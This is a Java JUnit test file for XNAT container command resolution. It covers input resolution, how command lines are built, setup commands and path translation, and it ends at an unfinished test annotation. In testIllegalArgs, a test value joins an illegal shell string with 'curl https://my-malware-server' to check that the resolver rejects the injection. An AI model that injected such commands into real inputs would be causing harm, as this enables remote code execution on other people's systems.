package org.nrg.containers;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.common.collect.ImmutableMap;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.io.FileUtils;
import org.hamcrest.Matchers;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.junit.rules.TestRule;
import org.junit.rules.TestWatcher;
import org.junit.runner.Description;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.nrg.containers.config.ObjectMapperConfig;
import org.nrg.containers.exceptions.CommandResolutionException;
import org.nrg.containers.exceptions.IllegalInputException;
import org.nrg.containers.model.command.auto.Command;
import org.nrg.containers.model.command.auto.Command.CommandWrapper;
import org.nrg.containers.model.command.auto.Command.CommandWrapperExternalInput;
import org.nrg.containers.model.command.auto.ResolvedCommand;
import org.nrg.containers.model.command.auto.ResolvedCommandMount;
import org.nrg.containers.model.command.auto.ResolvedInputTreeNode;
import org.nrg.containers.model.command.auto.ResolvedInputValue;
import org.nrg.containers.model.command.entity.CommandType;
import org.nrg.containers.model.configuration.CommandConfiguration;
import org.nrg.containers.model.server.docker.Backend;
import org.nrg.containers.model.server.docker.DockerServerBase;
import org.nrg.containers.model.xnat.Assessor;
import org.nrg.containers.model.xnat.Project;
import org.nrg.containers.model.xnat.Resource;
import org.nrg.containers.model.xnat.Scan;
import org.nrg.containers.model.xnat.Session;
import org.nrg.containers.model.xnat.XnatFile;
import org.nrg.containers.services.CommandResolutionService;
import org.nrg.containers.services.CommandService;
import org.nrg.containers.services.DockerServerService;
import org.nrg.containers.services.DockerService;
import org.nrg.containers.services.impl.CommandResolutionServiceImpl;
import org.nrg.xdat.preferences.SiteConfigPreferences;
import org.nrg.xdat.security.helpers.Users;
import org.nrg.xdat.services.cache.UserDataCache;
import org.nrg.xft.security.UserI;
import org.nrg.xnat.services.archive.CatalogService;
import org.powermock.api.mockito.PowerMockito;
import org.powermock.core.classloader.annotations.PrepareForTest;
import org.powermock.modules.junit4.PowerMockRunner;

import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;

import static org.hamcrest.Matchers.containsInAnyOrder;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.nullValue;
import static org.hamcrest.Matchers.startsWith;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.fail;
import static org.mockito.Matchers.any;
import static org.mockito.Matchers.eq;
import static org.mockito.Mockito.doAnswer;
import static org.mockito.Mockito.when;

@Slf4j
@RunWith(PowerMockRunner.class)
@PrepareForTest(Users.class)
public class CommandResolutionTest {
    public static final String HELLO_1 = "hello1.txt";
    public static final String HELLO_2 = "hello2.txt";
    public static final String SUBDIR = "subdir";
    public static final Path HELLO_2_RELATIVE = Paths.get(SUBDIR, HELLO_2);

    static final String uuidChar = "[0-9a-f]";
    static final String buildDirPattern = uuidChar + "{8}-" + uuidChar + "{4}-" + uuidChar + "{4}-" + uuidChar + "{4}-" + uuidChar + "{12}";

    private UserI userI;
    private Command mainCommand;
    private Map<String, Command.ConfiguredCommand> mainConfiguredCommandsByName;
    private String resourceDir;
    private String buildDir;

    final String pathTranslationXnatPrefix = "/some/fake/xnat/path";
    final String pathTranslationContainerHostPrefix = "/some/other/fake/path/to/another/place";

    private CommandResolutionService commandResolutionService;

    @Mock private SiteConfigPreferences siteConfigPreferences;
    @Mock private DockerService dockerService;
    @Mock private DockerServerService dockerServerService;
    @Mock private CatalogService catalogService;
    @Mock private UserDataCache userDataCache;
    @Mock private CommandService commandService;

    private ObjectMapper mapper;

    @Rule
    public TemporaryFolder folder = new TemporaryFolder(new File("/tmp"));

    @Rule
    public TestRule watcher = new TestWatcher() {
        protected void starting(Description description) {
            log.info("BEGINNING TEST " + description.getMethodName());
        }

        protected void finished(Description description) {
            log.info("ENDING TEST " + description.getMethodName());
        }
    };

    @Before
    public void setup() throws Exception {

        mapper = (new ObjectMapperConfig()).objectMapper();

        // Mock out a user for tests. Will return this as "admin" user.
        userI = Mockito.mock(UserI.class);
        when(userI.getLogin()).thenReturn("mockUser");
        PowerMockito.mockStatic(Users.class);
        PowerMockito.when(Users.getAdminUser()).thenReturn(userI);

        // Read test data files for command + wrappers
        resourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest").toURI()).toString().replace("%20", " ");
        final String commandJsonFile = resourceDir + "/command.json";
        mainCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        mainConfiguredCommandsByName = mainCommand.xnatCommandWrappers().stream()
                .collect(Collectors.toMap(CommandWrapper::name, commandWrapper -> configure(mainCommand, commandWrapper)));

        // Mock build dir
        buildDir = folder.newFolder().getAbsolutePath();
        when(siteConfigPreferences.getBuildPath()).thenReturn(buildDir);

        // Not testing remote files right now
        when(catalogService.hasRemoteFiles(eq(userI), any(String.class))).thenReturn(false);

        // Mock server settings (used for path translation prefixes)
        when(dockerServerService.getServer()).thenReturn(DockerServerBase.DockerServer.builder()
                .pathTranslationXnatPrefix(pathTranslationXnatPrefix)
                .pathTranslationDockerPrefix(pathTranslationContainerHostPrefix)
                .id(0)
                .name("")
                .host("")
                .backend(Backend.DOCKER)
                .lastEventCheckTime(new Date())
                .pullImagesOnXnatInit(false)
                .autoCleanup(false)
                .build());

        commandResolutionService = new CommandResolutionServiceImpl(commandService, dockerServerService,
                siteConfigPreferences, mapper, dockerService, catalogService, userDataCache);
    }

    private Command.ConfiguredCommand configure(Command command, CommandWrapper wrapper) {
        final CommandConfiguration commandConfiguration = CommandConfiguration.create(command, wrapper, null);
        final Command commandWithOneWrapper = command.toBuilder().xnatCommandWrappers(wrapper).build();
        return commandConfiguration.apply(commandWithOneWrapper);
    }

    private CommandWrapper wrapperByName(final Command command, final String wrapperName) {
        CommandWrapper wrapper = null;
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            if (wrapperName.equals(commandWrapper.name())) {
                wrapper = commandWrapper;
                break;
            }
        }
        assertThat(wrapper, is(not(nullValue(CommandWrapper.class))));
        return wrapper;
    }

    @Test
    public void testSessionScanResource() throws Exception {
        final String commandWrapperName = "session-scan-resource";
        final String inputPath = resourceDir + "/testSessionScanResource/session.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String dicomDir = folder.newFolder("DICOM").getAbsolutePath();
        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Scan scan = session.getScans().get(0);
        scan.getResources().get(0).setDirectory(dicomDir);

        final Map<String, String> runtimeValues = Collections.singletonMap("session", mapper.writeValueAsString(session));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan", scan.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("dicom", scan.getResources().get(0).getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan-id", scan.getId()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("frames", String.valueOf(scan.getFrames())));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("series-description", scan.getSeriesDescription()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("modality", scan.getModality()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("quality", scan.getQuality()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("note", scan.getNote()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", scan.getId()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testResourceFile() throws Exception {
        final String commandWrapperName = "scan-resource-file";
        final String inputPath = resourceDir + "/testResourceFile/scan.json";

        // I want to set a resource directory at runtime, so pardon me while I do some unchecked stuff with the values I just read
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Scan scan = mapper.readValue(new File(inputPath), Scan.class);
        final Resource resource = scan.getResources().get(0);
        resource.setDirectory(resourceDir);
        resource.getFiles().get(0).setPath(resourceDir + "/" + resource.getFiles().get(0).getName());
        final XnatFile file = resource.getFiles().get(0);

        final Map<String, String> runtimeValues = Collections.singletonMap("a-scan", mapper.writeValueAsString(scan));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("a-scan", scan.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-resource", resource.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-file", file.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("a-file-path", file.getPath()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan-id", scan.getId()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", file.getPath()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", scan.getId()));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProject() throws Exception {
        final String commandWrapperName = "project";
        final String inputPath = resourceDir + "/testProject/project.json";

        final Project project = mapper.readValue(new File(inputPath), Project.class);
        final Map<String, String> runtimeValues = Collections.singletonMap("project", mapper.writeValueAsString(project));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("project", project.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("project-label", project.getLabel()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", project.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));
        log.debug("Configured command for wrapper name \"{}\": {}", commandWrapperName, configuredCommand);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testProjectSubject() throws Exception {
        final String commandWrapperName = "project-subject";
        final String inputPath = resourceDir + "/testProjectSubject/project.json";

        final Project project = mapper.readValue(new File(inputPath), Project.class);

        final Map<String, String> runtimeValues = Collections.singletonMap("project", mapper.writeValueAsString(project));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("project", project.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("subject", project.getSubjects().get(0).getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("project-label", project.getLabel()));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", project.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionAssessor() throws Exception {
        final String commandWrapperName = "session-assessor";
        final String inputPath = resourceDir + "/testSessionAssessor/session.json";

        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Assessor assessor = session.getAssessors().get(0);

        final Map<String, String> runtimeValues = Collections.singletonMap("session", mapper.writeValueAsString(session));

        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("assessor", assessor.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("assessor-label", assessor.getLabel()));

        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever", assessor.getLabel()));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionScanMultiple() throws Exception {
        final String commandWrapperName = "session-scan-mult";
        final String inputPath = resourceDir + "/testSessionScanMult/session.json";

        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Map<String, String> runtimeValues = Collections.singletonMap("session", mapper.writeValueAsString(session));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan",
                session.getScans().stream().map(Scan::getId).collect(Collectors.joining(", "))));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever",
                session.getScans().stream().map(Scan::getId).collect(Collectors.joining(" "))));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    @Test
    public void testSessionScanMultipleUri() throws Exception {
        final String commandWrapperName = "session-scan-mult-uri";
        final String inputPath = resourceDir + "/testSessionScanMult/session.json";

        final Session session = mapper.readValue(new File(inputPath), Session.class);
        final Map<String, String> runtimeValues = Collections.singletonMap("session", mapper.writeValueAsString(session));

        // xnat wrapper inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues = new HashSet<>();
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("session", session.getUri()));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperExternal("T1-scantype", "\"SCANTYPE\", \"OTHER_SCANTYPE\""));
        expectedWrapperInputValues.add(ResolvedCommand.ResolvedCommandInput.wrapperDerived("scan",
                session.getScans().stream().map(Scan::getUri).collect(Collectors.joining(", "))));

        // command inputs
        final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues = new HashSet<>();
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("whatever",
                session.getScans().stream().map(Scan::getUri).collect(Collectors.joining(" "))));
        expectedCommandInputValues.add(ResolvedCommand.ResolvedCommandInput.command("file-path", "null"));

        final Command.ConfiguredCommand configuredCommand = mainConfiguredCommandsByName.get(commandWrapperName);
        assertThat(configuredCommand, is(not(nullValue())));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertStuffAboutResolvedCommand(resolvedCommand, configuredCommand,
                runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
    }

    private void assertStuffAboutResolvedCommand(final ResolvedCommand resolvedCommand,
                                                 final Command.ConfiguredCommand configuredCommand,
                                                 final Map<String, String> expectedRawInputValues,
                                                 final Set<ResolvedCommand.ResolvedCommandInput> expectedWrapperInputValues,
                                                 final Set<ResolvedCommand.ResolvedCommandInput> expectedCommandInputValues) {
        assertThat(resolvedCommand.commandId(), is(configuredCommand.id()));
        assertThat(resolvedCommand.wrapperId(), is(configuredCommand.wrapper().id()));
        assertThat(resolvedCommand.image(), is(configuredCommand.image()));
        assertThat(resolvedCommand.commandLine(), is(configuredCommand.commandLine()));
        assertThat(resolvedCommand.environmentVariables().isEmpty(), is(true));
        assertThat(resolvedCommand.mounts().isEmpty(), is(true));
        assertThat(resolvedCommand.type(), is(CommandType.DOCKER.getName()));
        assertThat(resolvedCommand.ports().isEmpty(), is(true));

        // Inputs
        assertThat(resolvedCommand.rawInputValues(), is(expectedRawInputValues));
        assertThat(resolvedCommand.wrapperInputValues(), is(expectedWrapperInputValues));
        assertThat(resolvedCommand.commandInputValues(), is(expectedCommandInputValues));

        // Outputs
        assertThat(resolvedCommand.outputs().isEmpty(), is(true));
    }

    @Test
    public void testRequiredParamNotBlank() throws Exception {
        final String commandJsonFile = resourceDir + "/params-command.json";
        final String wrapperName = "blank-wrapper";
        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = wrapperByName(command, wrapperName);
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final Map<String, String> filledRuntimeValues = new HashMap<>();
        filledRuntimeValues.put("REQUIRED_WITH_FLAG", "foo");
        filledRuntimeValues.put("REQUIRED_NO_FLAG", "bar");

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, filledRuntimeValues, userI);
        assertThat(resolvedCommand.commandInputValues(),
                containsInAnyOrder(
                        ResolvedCommand.ResolvedCommandInput.command("REQUIRED_WITH_FLAG", "foo"),
                        ResolvedCommand.ResolvedCommandInput.command("REQUIRED_NO_FLAG", "bar"),
                        ResolvedCommand.ResolvedCommandInput.command("NOT_REQUIRED", "null")
                )
        );
        assertThat(resolvedCommand.commandLine(), is("echo bar --flag foo "));

        try {
            commandResolutionService.resolve(configuredCommand, Collections.emptyMap(), userI);
            fail("Command resolution should have failed with missing required parameters.");
        } catch (CommandResolutionException e) {
            assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
        }
    }

    @Test
    public void testMultiParamCommandLine() throws Exception {
        final String commandJsonFile = resourceDir + "/multi-command.json";
        final String wrapperName = "multiple";

        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = wrapperByName(command, wrapperName);
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final String inputPath = resourceDir + "/testSessionScanMult/session.json";
        final Session session = mapper.readValue(new File(inputPath), Session.class);

        final Map<String, String> runtimeValues = Collections.singletonMap("session", mapper.writeValueAsString(session));

        List<String> scanIds = session.getScans().stream().map(Scan::getId).collect(Collectors.toList());
        String spacedScanIds = String.join(" ", scanIds);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        assertThat(resolvedCommand.commandInputValues(),
                containsInAnyOrder(
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG1", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_FLAG2", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_QSPACE", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_QSPACE_FLAG", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_COMMA", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_SPACE", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_DEFAULT", spacedScanIds),
                        ResolvedCommand.ResolvedCommandInput.command("MULTI_COMMA_FLAG", spacedScanIds)

                )
        );

        String cmdLine = "echo --flag=scan1 --flag=scan2 --flag scan1 --flag scan2 'scan1 scan2' --flag='scan1 scan2' " +
                "scan1,scan2 scan1 scan2 scan1 scan2 -alt scan1,scan2";
        assertThat(resolvedCommand.commandLine(), is(cmdLine));
    }

    @Test
    public void testSelectParamCommandLine() throws Exception {
        final String commandJsonFile = resourceDir + "/select-command.json";
        final String wrapperName = "multiple";

        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = wrapperByName(command, wrapperName);
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final Map<String, String> runtimeValues = Collections.emptyMap();

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
        String cmdLine = "echo --flag=scan1 --flag=scan2 --flag scan1 --flag scan2 'scan1 scan2' " +
                "scan1,scan2 scan1 scan2 scan1";
        assertThat(resolvedCommand.commandLine(), is(cmdLine));
    }

    @Test
    public void testIllegalArgs() throws Exception {
        final String commandJsonFile = resourceDir + "/illegal-args-command.json";
        final String wrapperName = "identity-wrapper";

        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = wrapperByName(command, wrapperName);
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final String inputName = "anything";

        for (final String illegalString : CommandResolutionService.ILLEGAL_INPUT_STRINGS) {

            // Ignore the fact that these aren't all valid shell commands. We are only checking for the presence of the substrings.
            final Map<String, String> runtimeValues = Collections.singletonMap(inputName, "foo " + illegalString + " curl https://my-malware-server");

            try {
                commandResolutionService.resolve(configuredCommand, runtimeValues, userI);
                fail("Command resolution should have failed because of the illegal string.");
            } catch (IllegalInputException e) {
                assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
                        inputName, illegalString)));
            }
        }
    }

    @Test
    public void testSerializeResolvedCommand() throws Exception {
        final Command.CommandWrapperExternalInput externalInput = CommandWrapperExternalInput.builder()
                .name("externalInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue externalInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("externalInputValue")
                .build();
        final Command.CommandWrapperDerivedInput derivedInput = Command.CommandWrapperDerivedInput.builder()
                .name("derivedInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue derivedInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("derivedInputValue")
                .build();
        final ResolvedInputTreeNode<CommandWrapperExternalInput> inputTree = ResolvedInputTreeNode.create(
                externalInput,
                Collections.singletonList(
                        ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(
                                externalInputValue,
                                Collections.singletonList(
                                        ResolvedInputTreeNode.create(
                                                derivedInput,
                                                Collections.singletonList(ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(derivedInputValue))
                                        )
                                )
                        )
                )
        );

        final ResolvedCommand resolvedCommand = ResolvedCommand.builder()
                .commandId(0L)
                .commandName("command")
                .commandDescription("command description")
                .wrapperId(0L)
                .wrapperName("wrapper")
                .wrapperDescription("wrapper description")
                .addEnvironmentVariable("name", "value")
                .addPort("1", "2")
                .addRawInputValue("input name", "input value")
                .addResolvedInputTree(inputTree)
                .image("image:tag")
                .commandLine("script.sh")
                .addMount(ResolvedCommandMount.builder()
                        .name("mount")
                        .containerPath("/path")
                        .writable(true)
                        .xnatHostPath("/xnat/path")
                        .containerHostPath("/container/path")
                        .build())
                .containerLabels(ImmutableMap.of("label_key", "label_value"))
                .genericResources(ImmutableMap.of("GenericResourceKey", "GenericResourceLabel"))
                .ulimits(ImmutableMap.of("ulimit01", "-1", "ulimit02", "123:456"))
                .build();

        mapper.writeValueAsString(resolvedCommand);
    }

    @Test
    public void testCommandWithSetupCommand() throws Exception {
        final String setupCommandResourceDir = Paths.get(ClassLoader.getSystemResource("setupCommand").toURI()).toString().replace("%20", " ");

        final String setupCommandJson = setupCommandResourceDir + "/setup-command.json";
        final Command setupCommand = mapper.readValue(new File(setupCommandJson), Command.class);

        final String commandWithSetupCommandJson = setupCommandResourceDir + "/command-with-setup-command.json";
        final Command commandWithSetupCommand = mapper.readValue(new File(commandWithSetupCommandJson), Command.class);
        final CommandWrapper commandWrapper = commandWithSetupCommand.xnatCommandWrappers().get(0);
        final Command.ConfiguredCommand configuredCommand = configure(commandWithSetupCommand, commandWrapper);

        // Mock setup command return value from service
        final String viaSetupCommand = commandWrapper.externalInputs().get(0).viaSetupCommand();
        when(dockerService.getCommandByImage(viaSetupCommand)).thenReturn(setupCommand);

        final String resourceInputJsonPath = setupCommandResourceDir + "/resource.json";
        // I need to set the resource directory to a temp directory
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Resource resourceInput = mapper.readValue(new File(resourceInputJsonPath), Resource.class);
        resourceInput.setDirectory(resourceDir);

        final Map<String, String> runtimeValues = Collections.singletonMap("resource", mapper.writeValueAsString(resourceInput));
        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);

        assertThat(resolvedCommand.mounts(), hasSize(1));
        final ResolvedCommandMount resolvedCommandMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedCommandMount.viaSetupCommand(), is("xnat/test-setup-command:latest:setup-command"));

        final String resolvedCommandMountPath = resolvedCommandMount.xnatHostPath();
        assertThat(resolvedCommandMountPath, is(resolvedCommandMount.containerHostPath()));
        assertThat(resolvedCommandMountPath, startsWith(buildDir));

        assertThat(resolvedCommand.setupCommands(), hasSize(1));
        final ResolvedCommand resolvedSetupCommand = resolvedCommand.setupCommands().get(0);
        assertThat(resolvedSetupCommand.commandId(), is(setupCommand.id()));
        assertThat(resolvedSetupCommand.commandName(), is(setupCommand.name()));
        assertThat(resolvedSetupCommand.image(), is(setupCommand.image()));
        assertThat(resolvedSetupCommand.wrapperId(), is(0L));
        assertThat(resolvedSetupCommand.wrapperName(), is(""));
        assertThat(resolvedSetupCommand.commandLine(), is(setupCommand.commandLine()));
        assertThat(resolvedSetupCommand.workingDirectory(), is(setupCommand.workingDirectory()));

        assertThat(resolvedSetupCommand.mounts(), hasSize(2));
        final ResolvedCommandMount expectedInputMount = ResolvedCommandMount.specialInput(resourceDir, resourceDir);
        final ResolvedCommandMount expectedOutputMount = ResolvedCommandMount.specialOutput(resolvedCommandMountPath, resolvedCommandMountPath);
        assertThat(resolvedSetupCommand.mounts(), containsInAnyOrder(expectedInputMount, expectedOutputMount));
    }

    @Test
    public void testPathTranslation() throws Exception {

        final String testResourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest/testPathTranslation").toURI()).toString().replace("%20", " ");
        final String commandJsonFile = testResourceDir + "/command.json";
        final Command command = mapper.readValue(new File(commandJsonFile), Command.class);
        final CommandWrapper wrapper = command.xnatCommandWrappers().get(0);
        final Command.ConfiguredCommand configuredCommand = configure(command, wrapper);

        final String inputPath = testResourceDir + "/resource.json";

        // Make a fake local directory path, and a fake container host directory path, using the prefixes.
        final String xnatHostDir = pathTranslationXnatPrefix + "/this/part/should/stay";
        final String containerHostDir = xnatHostDir.replace(pathTranslationXnatPrefix, pathTranslationContainerHostPrefix);

        final Resource resource = mapper.readValue(new File(inputPath), Resource.class);
        resource.setDirectory(xnatHostDir);
        resource.getFiles().get(0).setPath(xnatHostDir + "/" + resource.getFiles().get(0).getName());

        final Map<String, String> runtimeValues = Collections.singletonMap("resource", mapper.writeValueAsString(resource));

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(configuredCommand, runtimeValues, userI);

        assertThat(resolvedCommand.mounts(), Matchers.hasSize(1));

        final ResolvedCommandMount resolvedMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedMount.xnatHostPath(), is(xnatHostDir));
        assertThat(resolvedMount.containerHostPath(), is(containerHostDir));
    }

    @Test
